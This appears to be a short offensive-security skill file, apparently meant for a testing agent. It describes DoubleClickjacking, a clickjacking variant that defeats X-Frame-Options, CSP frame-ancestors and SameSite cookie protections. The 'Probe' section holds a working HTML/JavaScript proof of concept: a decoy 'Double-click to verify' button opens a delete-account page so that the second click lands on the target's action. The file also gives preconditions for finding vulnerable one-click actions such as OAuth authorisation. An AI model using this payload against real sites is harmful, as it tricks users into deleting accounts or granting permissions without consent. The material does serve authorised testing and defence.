---
name: doubleclickjacking
description: Clickjacking variant bypassing X-Frame-Options, CSP frame-ancestors, and SameSite cookies via double-click timing window. Use when sensitive one-click actions exist but framing is blocked.
---

# DoubleClickjacking

## Pattern
- Target has one-click sensitive actions (OAuth authorize, delete account, change email, grant permissions)
- X-Frame-Options or CSP frame-ancestors blocks traditional iframe clickjacking
- SameSite cookies prevent standard framing attacks
- No additional confirmation step (modal, re-auth, CAPTCHA) on the action

## Probe
PoC structure — no iframe required, bypasses ALL framing defenses:
```html
<button ondblclick="exploit()">Double-click to verify</button>
<script>
function exploit() {
  // First click: open target page with sensitive action
  var w = window.open('https://target.com/settings/delete-account');
  // Between clicks (~100ms): target page loads in new window
  // Second click: lands on the sensitive button in target window
  // Close attacker page to reveal target underneath
  setTimeout(function(){ window.close(); }, 50);
}
</script>
```
Key: exploits the timing gap between mousedown and mouseup in a double-click. First click opens target, second click lands on target's action button. No framing = no XFO/CSP/SameSite protection applies.

## Indicators
- Sensitive action executed without user's informed consent
- Works despite all standard clickjacking protections being present
- Requires social engineering (user must double-click on attacker page)

## Chain With
- Standalone — applies to any unprotected one-click sensitive action (OAuth, account management, permission grants)

## Reference
https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html
